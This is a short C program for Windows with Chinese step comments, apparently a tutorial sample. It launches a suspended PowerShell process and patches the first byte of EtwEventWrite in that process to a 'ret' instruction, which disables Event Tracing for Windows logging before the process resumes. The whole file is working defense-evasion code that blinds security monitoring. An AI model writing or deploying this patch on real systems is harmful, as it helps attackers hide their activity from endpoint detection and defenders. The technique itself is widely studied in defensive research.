#include <Windows.h>
#include <Tlhelp32.h>
int main() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	// 1. 建立一個 Powershell Process，並取得 Process Handle
	CreateProcessA(NULL, (LPSTR)"powershell -noexit", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// 2. 從 ntdll.dll 中取得 EtwEventWrite 的位址
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

	// 3. 把 EtwEventWrite 的位址的權限改成可讀、可寫、可執行(rwx)
	DWORD oldProtect;
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

	// 4. 將 EtwEventWrite 的 Function 的第一個 byte 改成 0xc3，也就是組語的 ret
	char patch = 0xc3;
	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &patch, sizeof(char), NULL);

	// 5. 把 EtwEventWrite 的權限改回，並且繼續執行 Process
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL);
	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}